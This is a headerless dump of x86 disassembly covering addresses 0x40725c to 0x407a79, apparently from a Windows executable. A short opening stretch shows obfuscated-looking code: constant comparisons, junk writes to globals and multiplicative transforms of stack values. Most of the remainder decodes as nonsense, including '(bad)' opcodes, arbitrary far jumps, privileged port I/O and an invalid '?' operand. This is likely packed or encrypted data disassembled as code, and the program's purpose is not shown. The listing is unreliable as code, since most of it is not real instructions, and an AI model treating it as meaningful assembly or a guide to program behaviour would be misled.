  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x43465f,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434793,0x434663
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434687
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x43467b,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x4346cb,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x4346bb,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x43476f
  4072cc:	mov    eax,ds:0x4347b3
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x9907a48
  4072fa:	add    al,0xb
  4072fc:	into   
  4072fd:	aas    
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407349
  407306:	sub    DWORD PTR [edx],edi
  407308:	stos   DWORD PTR es:[edi],eax
  407309:	scas   al,BYTE PTR es:[edi]
  40730a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40730b:	jnp    0x407307
  40730d:	iret   
  40730e:	sub    al,0x67
  407310:	(bad)
  407313:	lds    ecx,FWORD PTR [ebp-0x4ab253d]
  407319:	push   0xc
  40731b:	add    esi,0xa960bc84
  407321:	xchg   ebp,eax
  407322:	pop    ds
  407323:	and    al,0x5
  407325:	mov    cl,0x7c
  407327:	dec    edx
  407328:	leave  
  407329:	ret    0xbd0a
  40732c:	cdq    
  40732d:	sahf   
  40732e:	shr    bl,cl
  407330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407331:	fs fwait
  407333:	iret   
  407334:	jae    0x40739f
  407336:	xor    eax,0x65e58d9a
  40733b:	iret   
  40733c:	xor    al,0x5f
  40733e:	cmp    DWORD PTR [esi+0x48],ebx
  407341:	out    dx,eax
  407342:	jns    0x4073bb
  407344:	sbb    dl,bh
  407346:	sbb    al,0x47
  407348:	mov    ah,0x60
  40734a:	or     DWORD PTR [edx-0x41],esp
  40734d:	or     al,0xa2
  40734f:	dec    edi
  407350:	enter  0xf2fe,0x9
  407354:	and    DWORD PTR [ebx],ecx
  407356:	or     BYTE PTR ds:0xeee34f64,dl
  40735c:	push   ebx
  40735d:	aas    
  40735e:	and    cl,dl
  407360:	add    BYTE PTR [esi+0x5dcd221e],al
  407366:	mov    cl,0x94
  407368:	mov    ds:0x338d2e3a,eax
  40736d:	(bad)  
  40736e:	enter  0x8530,0x29
  407372:	pusha  
  407373:	enter  0xcb1b,0xf5
  407377:	or     dl,BYTE PTR [ebx]
  407379:	pop    ecx
  40737a:	jb     0x407326
  40737c:	pop    ecx
  40737d:	arpl   WORD PTR ds:0x521abae1,dx
  407383:	dec    esp
  407384:	mov    edi,0x558e883
  407389:	mov    dl,0x39
  40738b:	xor    BYTE PTR [ecx-0x3874de41],cl
  407391:	in     al,0x7
  407393:	(bad)  
  407394:	jmp    0x4073c1
  407396:	outs   dx,DWORD PTR es:[esi]
  407398:	or     ch,dl
  40739a:	loope  0x407374
  40739c:	xchg   edi,eax
  40739d:	(bad)  
  40739e:	aam    0xce
  4073a0:	xchg   edx,eax
  4073a1:	inc    esp
  4073a2:	xchg   edi,eax
  4073a3:	mov    dh,0x64
  4073a5:	fucom  st(2)
  4073a7:	out    0xfa,al
  4073a9:	jmp    0xb266:0xf1e233ca
  4073b0:	shr    BYTE PTR [ecx],1
  4073b2:	cmp    DWORD PTR [edi],esi
  4073b4:	mov    ebp,0xd8510d55
  4073b9:	fdivr  DWORD PTR [esi-0x3e]
  4073bc:	in     al,0x91
  4073be:	int    0x4d
  4073c0:	stos   DWORD PTR es:[edi],eax
  4073c1:	mov    esi,0x3baf858d
  4073c6:	fwait
  4073c7:	xchg   DWORD PTR [eax],ebp
  4073c9:	ds cmp al,0xe0
  4073cc:	xchg   esp,eax
  4073cd:	mov    ecx,0x45de1c3c
  4073d2:	rol    BYTE PTR [ebx],cl
  4073d4:	xchg   ecx,eax
  4073d5:	sbb    BYTE PTR [esi],dl
  4073d7:	out    0x7b,eax
  4073d9:	imul   esi,DWORD PTR [edi+0x713917e9],0x52
  4073e0:	int3   
  4073e1:	xor    eax,eax
  4073e3:	mov    ah,0x4f
  4073e5:	push   cs
  4073e6:	outs   dx,DWORD PTR ds:[esi]
  4073e7:	fstp   TBYTE PTR [esi]
  4073e9:	neg    BYTE PTR [esi+0x5e]
  4073ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ed:	lock sbb al,0xc3
  4073f0:	push   edi
  4073f1:	mov    dl,0x93
  4073f3:	and    al,BYTE PTR [eax+edi*4]
  4073f6:	adc    eax,0x117c2e37
  4073fb:	iret   
  4073fc:	jbe    0x407400
  4073fe:	sbb    ah,BYTE PTR [eax+0x2]
  407401:	xor    DWORD PTR [edx-0x3a],ecx
  407404:	jg     0x407418
  407406:	cmp    al,0xfc
  407408:	pop    edx
  407409:	inc    ecx
  40740a:	hlt    
  40740b:	div    DWORD PTR [ebp+edx*2+0xd072ba8]
  407412:	pop    esp
  407413:	or     eax,0xf9c0ba93
  407418:	fmul   st(6),st
  40741a:	into   
  40741b:	adc    eax,0x546aceb2
  407420:	pop    ebx
  407421:	sub    esp,edi
  407423:	mov    DWORD PTR [edi],ebx
  407425:	stc    
  407426:	test   eax,0xb34319a7
  40742b:	jmp    DWORD PTR [ecx-0x2cc92bd1]
  407431:	push   es
  407432:	gs mov dl,bh
  407435:	xchg   edx,eax
  407436:	ficomp WORD PTR [eax-0x7c153250]
  40743c:	mov    bl,0x2e
  40743e:	lea    esi,[ecx+0x8]
  407441:	xchg   esi,eax
  407442:	fimul  WORD PTR [edi+0x1e]
  407445:	clc    
  407446:	imul   DWORD PTR [esi]
  407448:	add    al,0xab
  40744a:	sbb    BYTE PTR [edi-0x1b8e30e5],0xc0
  407451:	shl    BYTE PTR [ebx],cl
  407453:	xor    al,0xb3
  407455:	stos   BYTE PTR es:[edi],al
  407456:	adc    ah,ah
  407458:	push   esp
  407459:	rcr    ebx,cl
  40745b:	inc    edi
  40745c:	fdivr  QWORD PTR [ebp-0x7a620216]
  407462:	lock add edx,edi
  407465:	(bad)  
  407466:	jmp    0xe13c6abe
  40746b:	adc    dl,bl
  40746d:	mov    ebp,0x7cad2287
  407472:	adc    eax,0x217cb60e
  407477:	mov    dl,0x90
  407479:	jne    0x407412
  40747b:	mov    eax,ds:0x82fbe95b
  407480:	in     eax,dx
  407481:	in     eax,0xd
  407483:	mov    esi,0xc02ca8c1
  407488:	ror    BYTE PTR [edx],cl
  40748a:	pop    esp
  40748b:	cdq    
  40748c:	inc    ecx
  40748d:	mov    cl,0xbe
  40748f:	(bad)  
  407490:	sar    BYTE PTR [esi-0x6be8d594],0x78
  407497:	das    
  407498:	push   ebp
  407499:	outs   dx,BYTE PTR ds:[esi]
  40749a:	retf   0xc8d6
  40749d:	dec    eax
  40749e:	popf   
  40749f:	cmp    BYTE PTR [edx+edx*8-0x16890e48],dh
  4074a6:	and    ebx,esp
  4074a8:	je     0x407516
  4074aa:	xchg   ebx,eax
  4074ab:	pop    ebx
  4074ac:	xchg   ebp,eax
  4074ad:	xchg   edi,eax
  4074ae:	into   
  4074af:	mov    dh,0xa3
  4074b1:	sar    DWORD PTR [edx-0x2c26d3db],cl
  4074b7:	leave  
  4074b8:	mov    gs,WORD PTR [eax+0x22]
  4074bb:	mov    eax,0xcc0bef01
  4074c0:	cmc    
  4074c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074c2:	and    BYTE PTR [ecx-0x3e686ef7],0xb8
  4074c9:	or     ah,BYTE PTR es:[ebp+eax*8+0x69]
  4074ce:	xor    esp,DWORD PTR [edx]
  4074d0:	hlt    
  4074d1:	xor    al,0xa0
  4074d3:	mov    gs,WORD PTR [edx-0x60a98154]
  4074d9:	push   ecx
  4074da:	jns    0x407544
  4074dc:	jae    0x407509
  4074de:	xchg   ebx,eax
  4074df:	ja     0x40754f
  4074e1:	sbb    eax,0xad5abc9a
  4074e6:	jno    0x407471
  4074e8:	les    edx,FWORD PTR [ebx+0x5e24a629]
  4074ee:	pushf  
  4074ef:	jle    0x407522
  4074f1:	jle    0x407481
  4074f3:	icebp  
  4074f4:	inc    esp
  4074f5:	xor    BYTE PTR [eax],cl
  4074f7:	call   0x66fb:0x489dc175
  4074fe:	outs   dx,DWORD PTR ds:[esi]
  4074ff:	pusha  
  407500:	or     ebp,ecx
  407502:	cdq    
  407503:	adc    eax,0xad07e82a
  407508:	push   cs
  407509:	push   ds
  40750a:	imul   esi,DWORD PTR [ebp-0x3c],0xffffffb5
  40750e:	shl    DWORD PTR [ecx-0xe],0x3d
  407512:	jmp    0xb170c28a
  407517:	arpl   WORD PTR [eax],bx
  407519:	cmp    al,0x93
  40751b:	jge    0x4074ce
  40751d:	mov    WORD PTR [eax+ebx*2-0x92f7482],cs
  407524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407525:	icebp  
  407526:	jp     0x40754f
  407528:	lock dec edx
  40752a:	sti    
  40752b:	mov    esi,0xf5f0e7f4
  407530:	cmp    esi,DWORD PTR [ecx-0xf]
  407533:	cmp    dl,BYTE PTR [eax]
  407535:	test   ecx,0xb02244be
  40753b:	xor    eax,0x7d0277cd
  407540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407541:	mov    esi,0x78d2dce8
  407546:	xlat   BYTE PTR ds:[ebx]
  407547:	inc    esp
  407548:	stc    
  407549:	out    0x29,al
  40754b:	bound  ebx,QWORD PTR [ebx+ebx*1+0x1ee1cd0d]
  407552:	cld    
  407553:	mov    ebx,0x6d4a9872
  407558:	jne    0x4075a0
  40755a:	int    0x8e
  40755c:	cmp    edi,ebp
  40755e:	jae    0x40753c
  407560:	rcl    BYTE PTR [edx],1
  407562:	and    BYTE PTR [edi+0x78bd22d9],dh
  407568:	(bad)  
  40756a:	rcr    BYTE PTR [ebp-0x753c54a4],cl
  407570:	movd   mm2,DWORD PTR [ecx+eiz*1-0x3fd7c529]
  407578:	and    DWORD PTR [eax-0x16811ec5],ebp
  40757e:	out    0xc9,al
  407580:	call   0xd193c7c
  407585:	pop    ebp
  407586:	adc    WORD PTR [ebx],cx
  407589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40758a:	fucomip st,st(0)
  40758c:	add    eax,0x4e23dc5
  407591:	adc    BYTE PTR [ecx*1+0x24bd948],cl
  407598:	inc    edi
  407599:	push   eax
  40759a:	ret    0x5ef7
  40759d:	jae    0x4075d2
  40759f:	mov    esi,0x2b8c65f3
  4075a4:	ficom  DWORD PTR [edi]
  4075a6:	in     eax,0x67
  4075a8:	mov    al,0xaa
  4075aa:	call   0xdad8:0x45ac6cab
  4075b1:	iret   
  4075b2:	loop   0x40758f
  4075b4:	dec    ecx
  4075b5:	jg     0x407571
  4075b7:	leave  
  4075b8:	sbb    DWORD PTR [ecx-0x72],ecx
  4075bb:	pop    ecx
  4075bc:	xchg   ebx,eax
  4075bd:	dec    edx
  4075be:	call   0x64edcd95
  4075c3:	pop    ds
  4075c4:	mov    eax,0xc29f7899
  4075c9:	hlt    
  4075ca:	ins    BYTE PTR es:[edi],dx
  4075cb:	and    dl,0xc1
  4075ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075cf:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4075d1:	dec    eax
  4075d2:	sbb    al,BYTE PTR [ebx+0x12396655]
  4075d8:	add    ch,BYTE PTR [ecx]
  4075da:	mov    edx,0x8d85ff65
  4075df:	sub    al,0xc2
  4075e1:	cdq    
  4075e2:	aad    0x5c
  4075e4:	jmp    0xa073e5a2
  4075e9:	mov    bh,0xa9
  4075eb:	repz inc ebx
  4075ed:	xlat   BYTE PTR ds:[ebx]
  4075ee:	ins    DWORD PTR es:[edi],dx
  4075ef:	call   0x5112:0x4a290d8
  4075f6:	inc    ebp
  4075f7:	jecxz  0x40758d
  4075f9:	mov    ch,0x2e
  4075fb:	sti    
  4075fc:	fbstp  TBYTE PTR [eax]
  4075fe:	lods   al,BYTE PTR ds:[esi]
  4075ff:	pop    edx
  407600:	pop    esp
  407601:	ret    0xf446
  407604:	ins    BYTE PTR es:[edi],dx
  407605:	or     DWORD PTR [edi],ebp
  407607:	mov    edi,edi
  407609:	hlt    
  40760a:	out    0x99,al
  40760c:	mov    eax,0x9046d34f
  407611:	push   ecx
  407612:	ret    0xa788
  407615:	pusha  
  407616:	shl    BYTE PTR [edx-0x6c9d3a6e],cl
  40761c:	adc    ebp,edi
  40761e:	xchg   ebx,eax
  40761f:	and    BYTE PTR [ecx+eiz*4-0x6d],0x1c
  407624:	(bad)  [edx-0x7d]
  407627:	cmp    eax,0x41df78ba
  40762c:	add    dl,BYTE PTR [eax]
  40762e:	shl    al,0x5c
  407631:	inc    ebx
  407632:	sub    al,0xce
  407634:	pop    ecx
  407635:	sbb    edx,DWORD PTR [ecx]
  407637:	jno    0x40765f
  407639:	sbb    DWORD PTR [ebx-0x28601048],edi
  40763f:	dec    esp
  407640:	fnstenv [ebx+edx*2+0x6da7a88d]
  407647:	mov    cl,0x19
  407649:	dec    esp
  40764a:	enter  0xf7e3,0x19
  40764e:	les    edx,FWORD PTR [edx+0x57]
  407651:	aas    
  407652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407653:	pop    es
  407654:	cmp    BYTE PTR [ebp-0x70],dl
  407657:	xchg   edx,eax
  407658:	aaa    
  407659:	(bad)  
  40765b:	bound  esp,QWORD PTR [ebx+eiz*1]
  40765e:	xor    al,0x3a
  407660:	pop    eax
  407661:	xchg   edi,eax
  407662:	sbb    al,0x56
  407664:	pop    eax
  407665:	lahf   
  407666:	or     ebp,ebx
  407668:	and    ah,bl
  40766a:	imul   edi,eax,0xffffff84
  40766d:	mul    DWORD PTR [edx+0x27]
  407670:	jns    0x407601
  407672:	dec    edi
  407673:	xchg   esp,eax
  407674:	xchg   BYTE PTR ds:0x529d1fe4,ch
  40767a:	jo     0x407650
  40767c:	xor    DWORD PTR [ecx],esp
  40767e:	push   esi
  40767f:	iret   
  407680:	jo     0x4076b1
  407682:	les    esi,FWORD PTR [edi-0x1bd7a2e0]
  407688:	repnz shl edx,cl
  40768b:	or     eax,0x6bbb95bf
  407690:	mov    eax,0xea350638
  407695:	adc    BYTE PTR [esi],bl
  407697:	outs   dx,BYTE PTR ds:[esi]
  407698:	pop    ebp
  407699:	inc    esp
  40769a:	pop    es
  40769b:	pop    edi
  40769c:	pushf  
  40769d:	aam    0x21
  40769f:	inc    edx
  4076a0:	and    esi,ebx
  4076a2:	inc    ebp
  4076a3:	outs   dx,BYTE PTR ds:[esi]
  4076a4:	(bad)  
  4076a5:	fistp  QWORD PTR [eax]
  4076a7:	pushf  
  4076a8:	sub    BYTE PTR [esi-0x71],cl
  4076ab:	fsubr  QWORD PTR [ebx-0x5bab7c0]
  4076b1:	add    al,0xc3
  4076b3:	rcr    DWORD PTR [eax],1
  4076b5:	jmp    0x5bde:0x76ea528a
  4076bc:	pushf  
  4076bd:	popf   
  4076be:	rcr    DWORD PTR [eax-0x5f724c4e],0x7c
  4076c5:	xor    ebp,ebp
  4076c7:	jmp    0x4ad17c3a
  4076cc:	das    
  4076cd:	sub    cl,bh
  4076cf:	out    dx,al
  4076d0:	push   esp
  4076d1:	xor    ah,BYTE PTR [edx]
  4076d3:	inc    edi
  4076d4:	cmp    esi,DWORD PTR [edx+0x5b]
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0xe95efda8
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x40770c
  40772b:	mov    ?,WORD PTR [ecx+0x4b]
  40772e:	repz pop ecx
  407730:	or     al,0x8f
  407732:	sbb    DWORD PTR [edx+0x28699882],ebp
  407738:	add    eax,0xfbbea814
  40773d:	xchg   ebx,eax
  40773e:	inc    ebx
  40773f:	outs   dx,DWORD PTR ds:[esi]
  407740:	loope  0x4077be
  407742:	pop    es
  407743:	mov    ah,BYTE PTR [ebx]
  407745:	mov    ds:0xb8e2f801,al
  40774a:	cdq    
  40774b:	fsub   DWORD PTR [ebp+0x24db098c]
  407751:	jbe    0x40773e
  407753:	cmp    eax,0x93b534d
  407758:	add    esp,DWORD PTR [edx+0x24]
  40775b:	imul   ebx,DWORD PTR [esi+0x3c6d58f3],0x5aa6417f
  407765:	hlt    
  407766:	dec    ebx
  407767:	pushf  
  407768:	inc    eax
  407769:	in     al,0x97
  40776b:	rcl    BYTE PTR [esi+eiz*1+0x1ec51c08],0x5e
  407773:	shr    BYTE PTR [edx+0x3a],1
  407776:	out    dx,al
  407777:	arpl   sp,sp
  407779:	sub    eax,0x72ce64e7
  40777e:	mov    edx,0x9d4e5d83
  407783:	jle    0x40776d
  407785:	sbb    ah,BYTE PTR [ecx]
  407787:	mov    ds,edi
  407789:	ss mov ah,0x5d
  40778c:	sbb    al,0xd8
  40778e:	mov    ecx,0xc32deca2
  407793:	push   cs
  407794:	dec    edi
  407795:	addr16 mov esi,0x4c2d849
  40779b:	xchg   al,dl
  40779d:	dec    BYTE PTR [ecx+0x3dc75a25]
  4077a3:	fdivr  DWORD PTR [esi+0x190cd27f]
  4077a9:	clc    
  4077aa:	or     eax,0xac9ddeaf
  4077af:	sub    BYTE PTR [eax],ch
  4077b1:	iret   
  4077b2:	popa   
  4077b3:	mov    dh,0x26
  4077b5:	sbb    DWORD PTR [esi+0x2c69c410],esp
  4077bb:	call   0x7c21:0x1aa40d1c
  4077c2:	ret    0x67b8
  4077c5:	mov    esi,0x18551640
  4077ca:	sbb    BYTE PTR [edx+0x4cb6f55a],dh
  4077d0:	ss (bad) 
  4077d3:	add    al,0xf1
  4077d5:	ss mov edi,0x2c04deac
  4077db:	cli    
  4077dc:	hlt    
  4077dd:	test   eax,0x4adf666
  4077e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077e3:	lea    edx,[edx+0xae3c0ef]
  4077e9:	cmp    dl,BYTE PTR [ebx+eax*2+0x6ee230b8]
  4077f0:	inc    edi
  4077f1:	xlat   BYTE PTR ds:[ebx]
  4077f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077f3:	xchg   ebp,eax
  4077f4:	adc    DWORD PTR [esi+0x73],0x7ea07f68
  4077fb:	xchg   ebx,eax
  4077fc:	push   ebx
  4077fd:	sub    DWORD PTR ds:0x23d02c99,ebp
  407803:	jecxz  0x407847
  407805:	rcr    DWORD PTR [ecx-0x34],1
  407808:	xchg   edi,eax
  407809:	mov    bh,0x91
  40780b:	fsubr  DWORD PTR [eax]
  40780d:	push   eax
  40780e:	sub    eax,0xaa77d1be
  407813:	jg     0x40781a
  407815:	fist   WORD PTR [edx+0x40cef9a6]
  40781b:	xor    BYTE PTR ds:[esi+0x54],dl
  40781f:	mov    ebp,0x489176ad
  407824:	add    al,0xa1
  407826:	ss and dh,dh
  407829:	push   es
  40782a:	dec    esp
  40782b:	ins    BYTE PTR es:[edi],dx
  40782c:	cdq    
  40782d:	lds    esp,FWORD PTR [ecx-0x36]
  407830:	jge    0x40782f
  407832:	rcr    DWORD PTR [eax],0x10
  407835:	and    eax,0x9f9a7f1c
  40783a:	jecxz  0x40787b
  40783c:	pushf  
  40783d:	mov    eax,ds:0xe2d8aa61
  407842:	or     DWORD PTR [eax-0xe],ebp
  407845:	sti    
  407846:	clc    
  407847:	adc    al,0xe
  407849:	adc    ecx,0x34de6ffa
  40784f:	pop    ss
  407850:	lea    ecx,[edx]
  407852:	ins    DWORD PTR es:[edi],dx
  407853:	sub    al,0x2c
  407855:	push   0x7f
  407857:	test   eax,0xc0460837
  40785c:	sub    BYTE PTR [ebx],ch
  40785e:	nop
  40785f:	or     cl,BYTE PTR [edx-0x61]
  407862:	and    bh,BYTE PTR [edx-0x7]
  407865:	cmp    eax,0xc4c8dbba
  40786a:	hlt    
  40786b:	push   ebx
  40786c:	test   DWORD PTR [edx],esi
  40786e:	sub    eax,0x565d178b
  407873:	jae    0x407843
  407875:	sub    ch,BYTE PTR [esi+ecx*4]
  407878:	lods   al,BYTE PTR ds:[esi]
  407879:	sub    cl,BYTE PTR ds:0xf775ebbd
  40787f:	mov    dl,0xa3
  407881:	fadd   DWORD PTR [ebp-0x22]
  407884:	jecxz  0x4078c3
  407886:	pop    edi
  407887:	in     al,0x21
  407889:	retf   
  40788a:	mov    dh,0x2a
  40788c:	mov    ah,0x1a
  40788e:	and    al,0x2a
  407891:	cld    
  407892:	add    eax,0xba26606c
  407897:	mov    cl,0x45
  407899:	(bad)  
  40789a:	sbb    ebx,esp
  40789c:	adc    DWORD PTR [edx+0x479c0a51],esp
  4078a2:	lods   al,BYTE PTR ds:[esi]
  4078a3:	mov    ecx,0x2cdabea9
  4078a8:	sub    DWORD PTR [esi+0x241cd868],esi
  4078ae:	pop    edx
  4078af:	stc    
  4078b0:	fst    QWORD PTR [ecx+0x34]
  4078b3:	pop    DWORD PTR [esi-0x78c43005]
  4078b9:	xchg   ch,bh
  4078bb:	cli    
  4078bc:	xchg   esi,eax
  4078bd:	push   0x5c
  4078bf:	popf   
  4078c0:	jmp    0x407884
  4078c2:	pop    DWORD PTR [edi+0x6a]
  4078c5:	push   es
  4078c6:	loopne 0x4078a1
  4078c8:	in     al,0x6d
  4078ca:	xchg   ebp,eax
  4078cb:	test   DWORD PTR [edi],ebx
  4078cd:	stos   BYTE PTR es:[edi],al
  4078ce:	cmc    
  4078cf:	xchg   edi,eax
  4078d0:	sub    al,0xab
  4078d2:	add    esi,DWORD PTR [ecx]
  4078d4:	add    ecx,edi
  4078d6:	add    al,cl
  4078d8:	inc    ebx
  4078d9:	scas   eax,DWORD PTR es:[edi]
  4078da:	mov    ecx,0x191489cf
  4078df:	cmp    eax,0x19e41c1a
  4078e4:	push   esp
  4078e5:	inc    edi
  4078e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078e7:	gs sbb al,cl
  4078ea:	xchg   ebx,eax
  4078eb:	stos   DWORD PTR es:[edi],eax
  4078ec:	push   ds
  4078ed:	mov    ebx,0xafbd6fe2
  4078f2:	cmp    eax,0x49108b35
  4078f7:	stos   BYTE PTR es:[edi],al
  4078f8:	imul   edx,DWORD PTR [ecx+0x2da9020c],0xffffff95
  4078ff:	in     eax,0x7e
  407901:	pop    esi
  407902:	or     eax,DWORD PTR [edi-0x377b9a69]
  407908:	(bad)  
  407909:	inc    ecx
  40790a:	stc    
  40790b:	dec    ebp
  40790c:	xlat   BYTE PTR ds:[ebx]
  40790d:	clc    
  40790e:	ins    DWORD PTR es:[edi],dx
  40790f:	inc    ebx
  407910:	cdq    
  407911:	shl    DWORD PTR [esi+0x44cffa7],cl
  407917:	push   0xe07a78f8
  40791c:	cmp    edx,DWORD PTR [ebx]
  40791e:	xchg   edi,eax
  40791f:	pop    edx
  407920:	jle    0x4078b4
  407922:	call   0x4703:0x571d6bf1
  407929:	push   ecx
  40792a:	push   0xffffff93
  40792c:	jg     0x407914
  40792e:	dec    esp
  40792f:	or     eax,0xe1ef4a32
  407934:	icebp  
  407935:	int    0xaa
  407937:	(bad)  
  407938:	and    ah,al
  40793a:	jne    0x4078f7
  40793c:	mov    ebp,0xe07ae068
  407941:	std    
  407942:	arpl   WORD PTR [ebx+0x6c0f091d],di
  407948:	jecxz  0x4078d9
  40794a:	rol    DWORD PTR [esi],cl
  40794c:	add    DWORD PTR [edx-0x50c6913b],ecx
  407952:	inc    ecx
  407953:	out    0x30,eax
  407955:	imul   esi,DWORD PTR ds:0x885fba51,0x17
  40795c:	lahf   
  40795d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40795e:	jecxz  0x4079b3
  407960:	jge    0x4078f5
  407962:	ret    
  407963:	jge    0x4079bc
  407965:	icebp  
  407966:	mov    bl,0x5a
  407968:	or     eax,0xe47e6483
  40796d:	icebp  
  40796e:	cmp    ebx,esi
  407970:	or     al,0x61
  407972:	or     ebx,esp
  407974:	or     BYTE PTR [ebp-0x7c],bh
  407977:	cwde   
  407978:	xchg   ebx,eax
  407979:	imul   esi,ebp,0xaa9d6eb3
  40797f:	div    esp
  407981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407982:	test   al,0x34
  407984:	stos   BYTE PTR es:[edi],al
  407985:	or     BYTE PTR [eax-0x424f2140],dl
  40798b:	xor    bl,BYTE PTR [ebp-0xc79442d]
  407991:	jns    0x407927
  407993:	xchg   bl,ch
  407995:	sahf   
  407996:	(bad)  [eax+0x3dc76dec]
  40799c:	addr16 stc 
  40799e:	retf   0x3b7b
  4079a1:	pop    edx
  4079a2:	pop    es
  4079a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079a4:	repz mov eax,ds:0xa506b9c
  4079aa:	sub    DWORD PTR [ecx+0x17],0x2c
  4079ae:	mov    bl,cl
  4079b0:	imul   BYTE PTR [eax-0x38]
  4079b3:	sub    al,0x7f
  4079b5:	out    dx,eax
  4079b6:	mov    ebp,0x68de44ee
  4079bb:	sbb    al,0x9e
  4079bd:	pop    esp
  4079be:	jle    0x4079ff
  4079c0:	jp     0x4079d7
  4079c2:	jecxz  0x4079cb
  4079c4:	mov    ebx,0xbc847374
  4079c9:	inc    esi
  4079ca:	push   cs
  4079cb:	jle    0x4079e9
  4079cd:	int    0xdd
  4079cf:	stos   DWORD PTR es:[edi],eax
  4079d0:	jmp    0x4155:0x955b7a6b
  4079d7:	pusha  
  4079d8:	inc    eax
  4079d9:	std    
  4079da:	out    0x92,eax
  4079dc:	pop    edx
  4079dd:	cli    
  4079de:	neg    DWORD PTR [eax]
  4079e0:	out    dx,eax
  4079e1:	mov    BYTE PTR [ebp+0x620a0191],0x60
  4079e8:	sub    eax,0x3f5d8426
  4079ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ee:	bound  ecx,QWORD PTR [eax-0x6baeb446]
  4079f4:	in     eax,dx
  4079f5:	push   ebx
  4079f6:	shr    BYTE PTR [edx],1
  4079f8:	clc    
  4079f9:	rol    DWORD PTR [esi+0x6fe9214c],cl
  4079ff:	jns    0x4079d3
  407a01:	sbb    ebx,edx
  407a03:	cmp    esi,0xffffff95
  407a06:	pop    es
  407a07:	or     BYTE PTR [eax+0x69],cl
  407a0a:	mov    ds:0x211b4e13,eax
  407a0f:	xchg   ebx,eax
  407a10:	xchg   DWORD PTR [edi+0x4c38cce6],eax
  407a16:	mov    esi,0x9388ddd9
  407a1b:	inc    edx
  407a1c:	mov    ch,0x5e
  407a1e:	dec    edx
  407a1f:	fwait
  407a20:	mov    al,ds:0x2d5063f7
  407a25:	into   
  407a26:	dec    edx
  407a27:	ficom  DWORD PTR [eax]
  407a29:	jle    0x407a7e
  407a2b:	pop    ds
  407a2c:	cmp    DWORD PTR [edi],esp
  407a2e:	sub    al,0x3a
  407a30:	mov    ebp,0x9b5dd582
  407a35:	inc    ebx
  407a36:	(bad)  
  407a37:	stc    
  407a38:	cmp    edx,DWORD PTR [eax+0x77]
  407a3b:	mov    eax,0xee9fa979
  407a40:	add    esi,esi
  407a42:	and    al,BYTE PTR [ecx]
  407a44:	daa    
  407a45:	push   ebp
  407a46:	aad    0xdc
  407a48:	int    0xd9
  407a4a:	cld    
  407a4b:	adc    DWORD PTR [ebx+0x7111e62b],edi
  407a51:	aam    0x4d
  407a53:	jecxz  0x407a27
  407a55:	add    eax,0x6abf181
  407a5a:	jb     0x407a16
  407a5c:	idiv   DWORD PTR [ebp-0x3e]
  407a5f:	mov    ds:0x34fe33d9,eax
  407a64:	mov    BYTE PTR [esi+esi*4+0x55cf68a8],dl
  407a6b:	sti    
  407a6c:	shr    ebp,0x98
  407a6f:	sub    DWORD PTR [edx+0x10],ebp
  407a72:	les    esp,FWORD PTR [edi+0x1cc7af3a]
  407a78:	in     al,dx
  407a79:	dec    ecx
